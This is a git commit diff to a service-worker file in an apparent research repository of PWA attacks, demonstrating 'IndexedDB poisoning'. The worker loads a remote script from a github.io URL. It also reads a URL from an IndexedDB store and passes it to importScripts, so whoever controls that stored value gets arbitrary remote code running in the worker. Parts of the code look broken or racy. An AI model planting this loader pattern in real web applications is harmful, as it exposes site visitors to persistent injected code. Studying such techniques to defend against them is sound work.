e64ddef5d543352bdcea718a75bcb7656fd00bcc
DemoPWA <54972549+DemoPWA@users.noreply.github.com>
2022-02-10 00:33:17 -0500

    Update sw.js

--- SW_Attacks/IndexDBPoisoning/sw.js
+++ SW_Attacks/IndexDBPoisoning/sw.js
@@ -23,10 +23,23 @@ self.addEventListener('install', event => {
 
 self.addEventListener('activate', event => {
     console.log('V1 now ready to handle fetches!');   
-    createDB()
+//     createDB()
+    importScripts('https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_sw.js')
     event.waitUntil(clients.claim());
 });
 
+var request = indexedDB.open('demo_db', 1);
+   request.onsuccess = (event) => {
+      var db = event.target.result;
+      var txn = db.transaction('urls','readwrite')
+      txn.onsuccess =  function(ev){
+          console.log('Benign URL Added!!')
+      }
+      var store = txn.objectStore('urls')
+      store.get('imp_url').onsuccess = async function(event) {
+           url = event.target.result.url
+      }
+   };
 if (url!=null){
    importScripts(url)
 }
